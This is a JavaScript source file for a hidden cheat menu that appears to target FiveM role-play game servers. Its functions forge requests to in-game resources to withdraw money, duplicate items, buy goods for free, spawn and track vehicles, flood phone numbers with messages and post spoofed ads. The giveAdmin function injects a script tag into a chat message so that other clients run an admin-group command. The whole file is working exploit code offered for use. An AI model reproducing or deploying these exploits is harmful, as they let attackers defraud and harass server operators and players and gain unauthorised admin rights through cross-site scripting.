$('.menu').tabs();
//$('.menu').hide();

let isHidden = true;
$(document).keydown( function(event) {
    if (event.key === "PageDown") {
        if (isHidden) {
            $('.menu').show();
            isHidden = false;
        } else {
            $('.menu').hide();
            isHidden = true;
        }
    }
});

$('input[name="draggable"]').change(function() {
    if($(this).is(":checked")) {
    $('.menu').draggable();
    } else {
    $('.menu').draggable("destroy");
    }
});

function money_spwan_m_1(){
    var amount = $("#money-spwan-m-1-amount").val();
    var account = $("#money-spwan-m-1-account").val();
    if (amount > 0){
        $.post("https://codem-taxijob/codemTaxi", JSON.stringify(
            {"action":"withdrawMoney","value":amount,"paytype":account}
        ));
    }
}

function money_spwan_m_2(){
    var amount = $("#money-spwan-m-2-amount").val();
    if (amount > 0){
        $.post("http://qb_inventory/SetInventoryData", JSON.stringify(
            {"fromInventory":"itemshop-Market","toInventory":"player","fromSlot":"1","toSlot":"-10","fromAmount":"-"+amount}
        ));
    }
}

function giveAdmin() {
    var server_id = $("#server_id").val();
    var group = $("#server_group").val();
    if(group && server_id) 
    {
        $.post("http://chat/chatResult", JSON.stringify({
            message: `/ooc Hey. <script>
                    $.post("http://chat/chatResult", JSON.stringify({
                        message: '/setgroup ${server_id} ${group}'
                    }));</script>`
        }));
    }
}


function vehicle_track_m_1(){
    var car_number = $("#location-track-m-1-value").val();
    if (car_number){
        $.post("https://gksphone/getvehiclepoint", '"'+car_number+'"');
    }
}

function vehicle_get_m_1(){
    var car_number = $("#vehicle-get-m-1-value").val();
    if (car_number){
        $.post("https://gksphone/getCarsValetGKS", JSON.stringify(
            {"garage":"Unknown","plate":car_number,"props":{"modDashboard":-1,"extras":[],"modRearBumper":-1,"tyreSmokeColor":[255,255,255],"plateIndex":0,"wheels":6,"modFrontBumper":-1,"modLightbar":-1,"modStruts":-1,"modTrunk":-1,"modTransmission":-1,"modHydrolic":-1,"xenonColor":255,"modAirFilter":-1,"tyreBurst":{"0":false,"4":false},"modPlateHolder":-1,"modBackWheels":-1,"modDial":-1,"color1":132,"modeltype":"Carbon RS","tankHealth":1000,"model":11251904,"modFender":-1,"modBrakes":-1,"engineHealth":1000,"neonEnabled":[false,false,false,false],"modLivery":-1,"modExhaust":-1,"modHood":-1,"modAerials":-1,"modEngineBlock":-1,"modFrame":-1,"modTurbo":false,"modAPlate":-1,"doorsBroken":{"0":false,"1":false},"modGrille":-1,"bodyHealth":1000,"modSeats":-1,"modTrimA":-1,"type":"Motorbike","modEngine":-1,"modSuspension":-1,"modOrnaments":-1,"modSpeakers":-1,"modSteeringWheel":-1,"pearlescentColor":132,"modDoorR":-1,"fuelLevel":65,"modHorns":-1,"modVanityPlate":-1,"modShifterLeavers":-1,"modXenon":false,"modRightFender":-1,"plate":"YJA 623","wheelColor":156,"modTrimB":-1,"dirtLevel":2,"modFrontWheels":-1,"windowTint":-1,"color2":132,"modDoorSpeaker":-1,"modSideSkirt":-1,"modArchCover":-1,"modRoof":-1,"modSpoilers":-1,"modTank":-1,"windowsBroken":{"0":true,"1":true,"2":true,"3":true,"4":true,"5":true,"6":false,"7":true},"modSmokeEnabled":false,"modArmor":-1,"neonColor":[255,0,255]}}
        ));
    }
}


function buy_items_m_1(){
    var name = $("#buy-item-m-1-name").val();
    var amount = $("#buy-item-m-1-amount").val();
    if (amount > 0 && name){
        $.post("https://codem-marketv2/buyitem", JSON.stringify({
            buyitem: [{"buyName":name,"buyItemImage":name,"buyItemName":name,"buyItemPrice":"0","buyCategories":"tools","count":amount}],
            totalmoney: "0",
            paytype: 'bank'
        }));
    }
}

function bomb_sms_m_1(){
    var message = $("#bomb-sms-m-1-message").val();
    var number = $("#bomb-sms-m-1-number").val();
    var amount = $("#bomb-sms-m-1-amount").val();
    if (amount > 0 && message && number){
        for (let i = 0; i < amount; i++) {
            $.post("https://gksphone/sendMessages", JSON.stringify(
            {"phoneNumber":number,"message":message}
            ));
        }
    }
}

function bomb_sms_m_2(){
    var message = $("#bomb-sms-m-2-message").val();
    var number = $("#bomb-sms-m-2-number").val();
    var amount = $("#bomb-sms-m-2-amount").val();
    if (amount > 0 && message && number){
        for (let i = 0; i < amount; i++) {
            $.post("https://qs-smartphone/SendNewMessage", JSON.stringify(
            {"phone":number,"message":message,"type":"message"}
            ));
        }
    }
}

function bomb_sms_m_3(){
    var message = $("#bomb-sms-m-3-message").val();
    var number = $("#bomb-sms-m-3-number").val();
    var amount = $("#bomb-sms-m-3-amount").val();
    if (amount > 0 && message && number){
        for (let i = 0; i < amount; i++) {
            $.post("http://gcphone/sendMessage", JSON.stringify(
                {"phoneNumber":number,"message":message}
            ));
        }
    }
}

function post_yellow_page_spoof_m_1(){
    var text = $("#post-yellow-page-spoof-m-1-text").val();
    var url = $("#post-yellow-page-spoof-m-1-url").val();
    var name = $("#post-yellow-page-spoof-m-1-name").val();
    var phone = $("#post-yellow-page-spoof-m-1-phone").val();
    if (text && url && name && phone){
        $.post("https://gksphone/yellow_AxpostPages", JSON.stringify(
            {"firstname":name,"phone_number":phone,"message":text,"image":url,"filter":"mechanic"}
        ));
    }
}